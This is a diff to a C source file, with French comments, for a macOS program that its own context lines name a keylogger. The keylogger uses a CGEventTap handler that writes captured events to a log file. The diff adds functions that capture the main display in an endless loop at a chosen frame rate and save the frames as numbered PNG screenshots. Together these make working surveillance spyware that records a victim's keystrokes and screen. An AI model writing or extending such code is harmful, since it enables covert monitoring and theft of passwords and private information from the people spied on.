@@ -58,6 +58,11 @@ void keylogger(const char *file_path) {
 
 #ifdef __APPLE__
 #include <ApplicationServices/ApplicationServices.h>
+#include <CoreGraphics/CoreGraphics.h>
+#include <ApplicationServices/ApplicationServices.h>
+#include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
 
 // Gestionnaire d'événements pour macOS
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
@@ -90,6 +95,46 @@ void start_keylogger(const char *file_path) {
     CFRunLoopRun();
 
     fclose(logfile); // Ferme le fichier une fois le keylogger terminé
+}
+
+void save_image(CGImageRef image, const char *filename) {
+    CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFStringCreateWithCString(NULL, filename, kCFStringEncodingUTF8), kCFURLPOSIXPathStyle, false);
+    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypePNG, 1, NULL);
+    CGImageDestinationAddImage(dest, image, NULL);
+    CGImageDestinationFinalize(dest);
+    CFRelease(url);
+    CFRelease(dest);
+}
+
+void capture_screen_at_fps(int target_fps, const char *output_directory) {
+    clock_t last_capture_time = clock();
+    int target_delay = CLOCKS_PER_SEC / target_fps;
+    int image_counter = 0;
+
+    while (1) {
+        clock_t current_time = clock();
+        int time_diff = current_time - last_capture_time;
+
+        // Si le temps écoulé est plus grand que le délai cible, on capture
+        if (time_diff >= target_delay) {
+            // Capture de l'écran
+            CGImageRef image = CGDisplayCreateImage(kCGDirectMainDisplay);
+            if (image != NULL) {
+                // Crée un nom de fichier unique basé sur le compteur d'image
+                char filename[1024];
+                snprintf(filename, sizeof(filename), "%s/screenshot_%d.png", output_directory, image_counter);
+
+                // Sauvegarde l'image dans le dossier spécifié
+                save_image(image, filename);
+                printf("Image sauvegardée : %s\n", filename);
+
+                CFRelease(image);
+                image_counter++; // Incrémenter le compteur d'images
+            }
+
+            last_capture_time = current_time; // Réinitialise l'heure de la dernière capture
+        }
+    }
 }
 
 #endif
